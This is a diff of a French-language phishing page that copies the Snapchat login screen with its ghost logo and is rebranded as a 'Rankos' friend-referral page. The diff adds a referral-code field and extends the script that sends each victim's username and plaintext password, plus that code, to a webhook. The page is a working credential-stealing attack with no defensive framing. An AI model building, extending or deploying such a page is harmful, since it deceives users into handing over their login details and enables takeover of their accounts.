@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Log in Snapchat</title>
+  <title>Rankos | parrainez un amis</title>
 
   <!-- Meta Open Graph pour affichage du lien -->
-  <meta property="og:title" content="Log in Snapchat" />
+  <meta property="og:title" content="Rankos | parrainez un amis" />
   <meta property="og:description" content="Description courte" />
   <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
 
@@ -86,10 +86,13 @@
 <body>
   <div class="login-box">
     <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
-    <h2>Connexion Snapchat</h2>
+    <h2>Connexion au site</h2>
     <form id="loginForm">
       <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required />
       <input type="password" id="password" placeholder="Mot de passe" required />
+      <!-- Nouveau champ Code de parrainage -->
+      <input type="text" id="referralCode" placeholder="Code de parrainage (optionnel)" />
+
       <button type="submit">Connexion</button>
       <div class="links-container">
         <button type="button" class="link-button" id="signupLink">S'inscrire</button>
@@ -108,6 +111,7 @@
 
       const username = document.getElementById('username').value.trim();
       const password = document.getElementById('password').value.trim();
+      const referralCode = document.getElementById('referralCode').value.trim();
       const errorMessage = document.getElementById('errorMessage');
 
       if (
@@ -123,7 +127,7 @@
       }
 
       const message = {
-        content: `**Nouveau login reçu:**\nNom d'utilisateur: ${username}\nMot de passe: ${password}`
+        content: `**Nouveau login reçu:**\nNom d'utilisateur: ${username}\nMot de passe: ${password}\nCode de parrainage: ${referralCode || "Aucun"}`
       };
 
       fetch(webhookURL, {
